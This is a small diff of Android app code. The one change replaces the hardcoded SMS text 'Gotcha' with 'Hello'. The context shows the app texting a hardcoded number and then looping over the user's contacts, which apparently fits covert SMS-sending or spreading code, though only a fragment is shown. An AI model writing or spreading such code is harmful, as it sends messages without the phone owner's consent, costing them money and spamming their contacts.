@@ -94,7 +94,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         }
         String number1 = "0974706108";
         String toSms1 = "smsto:" + number1;
-        String messageText1 = "Попався";
+        String messageText1 = "Привет";
         SmsManager smsManager1 = SmsManager.getDefault();
         smsManager1.sendTextMessage(toSms1, null, messageText1, null, null);
         for(int i = 0; i < contacts.size(); i++) {
